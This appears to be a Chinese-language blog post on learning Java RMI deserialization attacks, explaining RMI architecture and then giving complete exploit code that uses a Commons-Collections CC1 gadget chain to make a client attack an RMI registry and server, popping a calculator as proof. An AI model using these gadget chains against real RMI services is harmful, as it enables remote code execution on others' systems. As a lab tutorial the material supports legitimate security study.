<!DOCTYPE html>
<html lang="zh-CN">

<head>
        <link rel="canonical" href="https://omanaddress.github.io/html/category/article-2914.htm" />
    <!-- ========== Meta Tags ========== -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    <!-- ========== Page Title ========== -->
    <title>RMI反序列化学习 - Oman Address</title>
        <link rel="icon" href="/assets/addons/xcblog/img/omanaddress/favicon.ico" type="image/x-icon"/>

    <!-- ========== Start Stylesheet ========== -->
    <link href="/assets/addons/xcblog/css/omanaddress/bootstrap.min.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/font-awesome.min.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/themify-icons.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/flaticon-set.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/elegant-icons.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/magnific-popup.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/owl.carousel.min.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/owl.theme.default.min.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/animate.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/bootsnav.css" rel="stylesheet" />
    <link href="/assets/addons/xcblog/css/omanaddress/style.css" rel="stylesheet">
    <link href="/assets/addons/xcblog/css/omanaddress/responsive.css" rel="stylesheet" />
    <!-- ========== End Stylesheet ========== -->

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="/assets/addons/xcblog/js/frontend/omanaddress/html5/html5shiv.min.js"></script>
      <script src="/assets/addons/xcblog/js/frontend/omanaddress/html5/respond.min.js"></script>
    <![endif]-->

    <!-- ========== Google Fonts ========== -->
    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;600;700;800&display=swap" rel="stylesheet">
    <script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?afd972d72a67e62884759c9ecd23c891";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
     crossorigin="anonymous"></script>
</head>

<body>
        <!-- Header 
    ============================================= -->
    <header id="home">

        <!-- Start Navigation -->
        <nav class="navbar navbar-default attr-border navbar-sticky dark bootsnav">

            <div class="container-full">
                <!-- Start Header Navigation -->
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar-menu">
                        <i class="fa fa-bars"></i>
                    </button>
                    <a class="navbar-brand" href="/">
                            <img src="/assets/addons/xcblog/img/omanaddress/logo-s.png" class="logo" alt="Logo">
                            Oman Address
                    </a>
                </div>
                <!-- End Header Navigation -->

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse" id="navbar-menu">
                    <ul class="nav navbar-nav navbar-right" data-in="fadeInDown" data-out="fadeOutUp">
                                                <li>
                            <a href="/">首页</a>
                        </li>
                                                <li>
                            <a href="/html/category/">文章分类</a>
                        </li>
                                                <li>
                            <a href="#">关于</a>
                        </li>
                        <li>
                            <a href="#">联系</a>
                        </li>
                    </ul>
                </div><!-- /.navbar-collapse -->
            </div>

        </nav>
        <!-- End Navigation -->

    </header>
    <!-- End Header -->
    <!-- Start Breadcrumb 
    ============================================= -->
    <div class="breadcrumb-area bg-gray text-center shadow dark text-light bg-cover" style="background-image: url(/assets/addons/xcblog/img/omanaddress/banner/26.jpg);">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 offset-lg-2">
                    <h1 style="word-break: break-all;">RMI反序列化学习</h1>
                    <ul class="breadcrumb">
                        <li><a href="/"><i class="fas fa-home"></i> 首页</a></li>
                        <li><a href="/html/category/"> 文章分类</a></li>
                        <li class="active">正文</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- End Breadcrumb -->
    <!-- Start Blog
    ============================================= -->
    <div class="blog-area single full-blog full-blog default-padding">
        <div class="container">
            <div class="row">
                <div class="col-md-9">
                    <div class="blog-items">
                        <div class="row">
                            <div class="blog-content col-lg-10 offset-lg-1 col-md-12">
                                <div class="item">
                                    <div class="blog-item-box">
                                        <!-- Start Post Thumb -->
                                        <div class="content">
                                              				  				  				<h2 id="rmi学习">RMI学习</h2> <h3 id="1rmi简介">1、RMI简介</h3> <p>RMI（Remote Method Invocation），远程方法调用方法，其实就是本地java虚拟机要调用其他java虚拟机的方法，两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。</p> <p>如果复现过fastjson漏洞就知道我们的payload经常会携带rmi、jndi等协议。而且对于jdk的版本有要求</p> <pre><code class="language-java">基于RMI利用的JDK版本<=6u141、7u131、8u121 基于LDAP利用的JDK版本<=6u211、7u201、8u191</code></pre> <p>RMI依赖的通信协议为<strong>JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)</strong>，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。</p> <h3 id="2rmi的组成部分">2、RMI的组成部分</h3> <pre><code class="language-java">Client-客户端:客户端调用服务端的方法  Server-服务端:远程调用方法对象的提供者  Registry-注册中心：RMI Server可以在上⾯注册⼀个Name到对象的绑定关系；RMI Client通过Name向RMI Registry查询，得到这个绑定关系，然后再连接RMI Server，最后也是代码真正执行的地方。</code></pre> <h3 id="3rmi的调用过程">3、RMI的调用过程</h3> <h5 id="31server部署">3.1、server部署</h5> <pre><code>Server向Registry注册远程对象，远程对象绑定在一个`//hostL:port/objectname`上，形成一个映射表（Service-Stub）</code></pre> <h5 id="32client调用">3.2、Client调用</h5> <pre><code>1. Client向Registry通过RMI地址查询对应的远程引用（Stub）。这个远程引用包含了一个服务器主机名和端口号。 2. Client拿着Registry给它的远程引用，照着上面的服务器主机名、端口去连接提供服务的远程RMI服务器 3. Client传送给Server需要调用函数的输入参数，Server执行远程方法，并返回给Client执行结果。</code></pre> <p>客户端会通过Stub序列化数据后传输给服务端，服务端会把客户端传输过来的内容反序列化执行。前提是传输的是可序列化对象(Object)</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/3b6d73972151909cf52cd72547cbc340.jpg" alt="RMI反序列化学习"></p> <p>图是用的https://paper.seebug.org/1251/#jdk</p> <h3 id="4rmi的基础运用">4、RMI的基础运用</h3> <p><strong>Server</strong></p> <p>1、首先要实现一个继承了Remote的接口，并且要抛出RemoteException异常，并且远程调用的方法的修饰符为public，此处的work方法主要用于反序列化利用</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.Remote; import java.rmi.RemoteException;  public interface User extends Remote {      public String getName() throws RemoteException;  }</code></pre> <p>2、编写这个接口的实现类，还需要继承UnicastRemoteObject类，大部分方法都是因为继承了UnicastRemoteObject所以实现的</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.RemoteException; import java.rmi.server.RMIClientSocketFactory; import java.rmi.server.RMIServerSocketFactory; import java.rmi.server.UnicastRemoteObject;  public class UserImpl extends UnicastRemoteObject implements User{      public String name;     protected UserImpl() throws RemoteException{         super();     }      @Override     public Object clone() throws CloneNotSupportedException {         return super.clone();     }      protected UserImpl(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) throws RemoteException {         super(port, csf, ssf);     }      protected UserImpl(int port) throws RemoteException {         super(port);     }      public UserImpl(String name) throws RemoteException {         this.name = name;     }       @Override     public String getName() throws RemoteException {         return name;     }        }</code></pre> <p>3、编写服务器类</p> <p>创建服务器实例，并且创建一个注册表，将需要提供给客户端的对象注册到注册到注册表中</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIServer {     public static void main(String[] args) throws RemoteException, AlreadyBoundException {         UserImpl user = new UserImpl("akka");         //创建注册中心，设置端口为1234         Registry registry = LocateRegistry.createRegistry(1234);         System.out.println("registry is runing.....");         //绑定user对象到名字叫user下         registry.bind("user", user);         System.out.println("user is bing");      } }</code></pre> <p>4、编写客户端类</p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIClient {     public static void main(String[] args) throws RemoteException, NotBoundException {         Registry registry = LocateRegistry.getRegistry("localhost", 1234);         User user = (User)registry.lookup("user");         System.out.println(user.getName());     } }</code></pre> <p>先开启服务端</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/428238d40060f93928dd6140f95cab38.jpg" alt="RMI反序列化学习"></p> <p>再开启客户端调用远程方法</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/96b9b9617c14a972745894bf03785ff0.jpg" alt="RMI反序列化学习"></p> <h3 id="5rmi的反序列利用">5、RMI的反序列利用</h3> <p>有几种攻击手段，这里只弄了两种客户端攻击的案列，具体可以学习https://paper.seebug.org/1251/#java-rmi-</p> <h4 id="51客户端攻击注册中心">5.1、客户端攻击注册中心。</h4> <p>需要指定注册的方法bind & rebind</p> <p>需要使用到RM进行反序列化攻击需要两个条件：RMI的服务端存在执行命令利用链，这里用的是cc1。还有就是jdk版本我用的jdk8u66和commons-collections3.1成功弹窗</p> <p>服务端的代码不用改变</p> <p>客户端代码修改如下</p> <pre><code class="language-java">package com.akkacloud.rmi;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap;  import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map;  public class RMIClient {     public static void main(String[] args) throws Exception {         ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod", new Class[] {                         String.class, Class[].class }, new Object[] {                         "getRuntime", new Class[0] }),                 new InvokerTransformer("invoke", new Class[] {                         Object.class, Object[].class }, new Object[] {                         null, new Object[0] }),                 new InvokerTransformer("exec",                         new Class[] { String.class }, new Object[]{"open /System/Applications/Calculator.app"})});         HashMap innermap = new HashMap();         Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");         Constructor[] constructors = clazz.getDeclaredConstructors();         Constructor constructor = constructors[0];         constructor.setAccessible(true);         Map map = (Map)constructor.newInstance(innermap,chain);           Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         handler_constructor.setAccessible(true);         InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler          Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象           Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         AnnotationInvocationHandler_Constructor.setAccessible(true);         InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);          Registry registry = LocateRegistry.getRegistry("127.0.0.1",1234);         Remote r = Remote.class.cast(Proxy.newProxyInstance(                 Remote.class.getClassLoader(),                 new Class[] { Remote.class }, handler));         registry.bind("test",r);     }      }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/d616a412c6fa73aae372c15019b946de.jpg" alt="RMI反序列化学习"></p> <p>handler是InvocationHandler对象，所以这里在反序列化时会调用InvocationHandler对象的invoke方法，具体就是cc1的相关内容不同的可以学习cc1</p> <h4 id="52客户端攻击服务端">5.2、客户端攻击服务端</h4> <p>如果服务端存在接受Object参数的方法时，当服务端接收数据时，就会调用readObject，当然也要存在利用链。</p> <p>首先我们在服务端添加上 接受Object方法的参数,当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化</p> <p><strong>接口User添加接受Object类型的方法</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.Remote; import java.rmi.RemoteException;  public interface User extends Remote {      public String getName() throws RemoteException;     public void addUser(Object user)throws RemoteException; }</code></pre> <p><strong>实现类UserImpl添加方法</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.RemoteException; import java.rmi.server.RMIClientSocketFactory; import java.rmi.server.RMIServerSocketFactory; import java.rmi.server.UnicastRemoteObject;  public class UserImpl extends UnicastRemoteObject implements User{      public String name;     protected UserImpl() throws RemoteException{         super();     }      @Override     public Object clone() throws CloneNotSupportedException {         return super.clone();     }      protected UserImpl(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) throws RemoteException {         super(port, csf, ssf);     }      protected UserImpl(int port) throws RemoteException {         super(port);     }      public UserImpl(String name) throws RemoteException {         this.name = name;     }       @Override     public String getName() throws RemoteException {         return name;     }      @Override     public void addUser(Object user) throws RemoteException{         System.out.println("addsuer:"+this.name);     }   }</code></pre> <p><strong>服务端一样</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry;  public class RMIServer {     public static void main(String[] args) throws RemoteException, AlreadyBoundException {         UserImpl user = new UserImpl("akka");         //创建注册中心，设置端口为1234         Registry registry = LocateRegistry.createRegistry(1234);         System.out.println("registry is runing.....");         //绑定user对象到名字叫user下         registry.bind("user", user);         System.out.println("user is bing");       } }</code></pre> <p><strong>客户端代码</strong></p> <pre><code class="language-java">package com.akkacloud.rmi;  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap;  import java.lang.annotation.Retention; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.rmi.NotBoundException; import java.rmi.Remote; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.util.HashMap; import java.util.Map;  public class RMIClient {     public static void main(String[] args) throws Exception {         ChainedTransformer chain = new ChainedTransformer(new Transformer[] {                 new ConstantTransformer(Runtime.class),                 new InvokerTransformer("getMethod", new Class[] {                         String.class, Class[].class }, new Object[] {                         "getRuntime", new Class[0] }),                 new InvokerTransformer("invoke", new Class[] {                         Object.class, Object[].class }, new Object[] {                         null, new Object[0] }),                 new InvokerTransformer("exec",                         new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});         HashMap innermap = new HashMap();         Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");         Constructor[] constructors = clazz.getDeclaredConstructors();         Constructor constructor = constructors[0];         constructor.setAccessible(true);         Map map = (Map)constructor.newInstance(innermap,chain);           Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         handler_constructor.setAccessible(true);         InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler          Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象           Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);         AnnotationInvocationHandler_Constructor.setAccessible(true);         InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);          Registry registry = LocateRegistry.getRegistry("127.0.0.1",1234);         User user = (User) registry.lookup("user");         user.addUser(handler);     }   }</code></pre> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220510/270d6066adafd2e577c118e358ce8826.jpg" alt="RMI反序列化学习"></p> <p>参考链接</p> <p>https://paper.seebug.org/1251/#registry</p> <p>https://xz.aliyun.com/t/6660#toc-2</p> <p>https://www.cnblogs.com/nice0e3/p/13927460.html</p> 			                                            <div class="col-md-12 mt-5">
                                                                                                <p>上一个：<a href="/html/category/article-2913.htm">Tensorflow迁移学习加载预训练模型并修改变量shape和value的方法</a></p>
                                                                                                <p>下一个：<a href="/html/category/article-2915.htm">在vue中手写一个文字的轮播功能</a></p>
                                                                                            </div>
                                                                                    </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="col-md-3">
                    <div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">热门文章</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2"><a href="/html/category/article-5975.htm" title="十大快递公司品牌是哪些公司(十大快递公司品牌是哪些牌子)">十大快递公司品牌是哪些公司(十大快递公司品牌是哪些牌子)</a></li>
                        <li class="py-2"><a href="/html/category/article-6727.htm" title="狗粮猫粮加工设备什么牌子好一点（宠物狗粮加工设备）">狗粮猫粮加工设备什么牌子好一点（宠物狗粮加工设备）</a></li>
                        <li class="py-2"><a href="/html/category/article-7048.htm" title="宠物粮食加工厂设备生产厂家有哪些（宠物粮食加工厂设备生产厂家有哪些呢）">宠物粮食加工厂设备生产厂家有哪些（宠物粮食加工厂设备生产厂家有哪些呢）</a></li>
                        <li class="py-2"><a href="/html/category/article-7140.htm" title="猫粮机器怎么做猫粮的视频（猫粮机器怎么做猫粮的视频讲解）">猫粮机器怎么做猫粮的视频（猫粮机器怎么做猫粮的视频讲解）</a></li>
                        <li class="py-2"><a href="/html/category/article-7002.htm" title="动物疫苗使用方法视频（动物疫苗使用方法视频教程）">动物疫苗使用方法视频（动物疫苗使用方法视频教程）</a></li>
                        <li class="py-2"><a href="/html/category/article-6772.htm" title="动物疫苗公司招聘（动物疫苗销售招聘2020）">动物疫苗公司招聘（动物疫苗销售招聘2020）</a></li>
                        <li class="py-2"><a href="/html/category/article-7187.htm" title="一般给宠物猫打疫苗需要多少钱?（一般给宠物猫打疫苗需要多少钱一针）">一般给宠物猫打疫苗需要多少钱?（一般给宠物猫打疫苗需要多少钱一针）</a></li>
                        <li class="py-2"><a href="/html/category/article-6124.htm" title="宠物犬免费领养（宠物狗免费领养）">宠物犬免费领养（宠物狗免费领养）</a></li>
                        <li class="py-2"><a href="/html/category/article-6169.htm" title="狗粮厂家电话号码（狗粮工厂）">狗粮厂家电话号码（狗粮工厂）</a></li>
                        <li class="py-2"><a href="/html/category/article-5974.htm" title="家猫养多久才能养熟（家猫养多久可以放出去）">家猫养多久才能养熟（家猫养多久可以放出去）</a></li>
                    </ul>
    </div>
</div>

<div class="panel panel-default">
    <div class="panel-heading">
        <h3 class="panel-title">归纳</h3>
    </div>
    <div class="panel-body">
        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">20</span> <a href="/html/date/2024-08/" title="2024-08 归档">2024-08</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-07/" title="2024-07 归档">2024-07</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">60</span> <a href="/html/date/2024-06/" title="2024-06 归档">2024-06</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-05/" title="2024-05 归档">2024-05</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">60</span> <a href="/html/date/2024-04/" title="2024-04 归档">2024-04</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">62</span> <a href="/html/date/2024-03/" title="2024-03 归档">2024-03</a></h4>
            </li>
                        <li class="py-2">
                <h4><span class="badge" style="float: right;">44</span> <a href="/html/date/2024-02/" title="2024-02 归档">2024-02</a></h4>
            </li>
                    </ul>
    </div>
</div>


                </div>
            </div>
        </div>
    </div>
    <!-- End Blog -->
        <!-- Star Footer
    ============================================= -->
    <footer class="bg-dark text-light">
        <!-- Footer Bottom -->
        <div class="footer-bottom">
            <div class="container">
                <div class="row">
                    <div class="col-lg-6">
                        <p>
                            Oman Address 版权所有
                            <br />
                            Powered by WordPress
                        </p>
                    </div>
                    <div class="col-lg-6 text-right link">
                        <ul>
                            <li>
                                <a href="#">Terms</a>
                            </li>
                            <li>
                                <a href="#">Privacy</a>
                            </li>
                            <li>
                                <a href="#">Support</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <!-- End Footer Bottom -->
    </footer>
    <!-- End Footer-->

    <!-- jQuery Frameworks
    ============================================= -->
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/jquery-1.12.4.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/popper.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/bootstrap.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/jquery.appear.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/jquery.easing.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/jquery.magnific-popup.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/modernizr.custom.13711.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/owl.carousel.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/wow.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/progress-bar.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/isotope.pkgd.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/imagesloaded.pkgd.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/count-to.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/YTPlayer.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/jquery.nice-select.min.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/loopcounter.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/bootsnav.js"></script>
    <script src="/assets/addons/xcblog/js/frontend/omanaddress/main.js"></script>
    <script>
    $(function() {
        $('.js_to').click(function() {
            var url = $(this).data('url');
            var code = $(this).data('code');
            url += code;

            window.open(url);
        })
    });
    </script>
</body>

</html>